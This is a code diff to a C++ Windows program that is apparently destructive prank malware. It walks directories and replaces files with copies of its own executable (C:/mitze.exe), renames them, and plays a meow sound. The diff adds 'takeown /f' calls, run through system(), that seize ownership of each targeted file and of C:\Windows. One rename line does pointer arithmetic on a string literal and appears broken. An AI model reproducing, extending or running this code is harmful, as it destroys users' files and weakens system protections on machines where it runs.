@@ -3,6 +3,8 @@
 #include <iostream>
 #include <array>
 #include <mmsystem.h>
+#include <accctrl.h>
+#include <aclapi.h>
 #pragma comment( lib, "Winmm.lib" )
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
@@ -38,6 +40,9 @@ void FckFiles(std::string directory, std::string fileFilter, bool recursively = 
 				cout << Chain;
 				string Chickfila = directory + std::string(FindFileData.cFileName);
 				mciSendString("play meow.mp3", NULL, 0, NULL);
+				string Gutter = "takeown /f " + string(Chickfila);
+				const char* Sucker = Gutter.c_str();
+				system(Sucker);
 				//PlaySound(TEXT("meow.mp3"),NULL,SND_FILENAME | SND_ASYNC);
 				CopyFile("C:/mitze.exe",Chickfila.c_str(),0);
 				rename(Chickfila.c_str(),"LOL_MITZE_KATZE.exe"+rand() % 999999);
@@ -64,6 +69,7 @@ int main(int argc, char* argv[])
     string abc = "abcdefghijklmnopqrstuvwxyz"; 
     char char_array[abc.length() + 1]; 
     strcpy(char_array, abc.c_str()); 
+	system("takeown /f C:\\Windows");
 	CopyFile("./a.exe","C:/mitze.exe",0);
 	CopyFile("./meow.mp3","C:/meow.mp3",0);
 	for(int i=0;i<abc.length();i++){
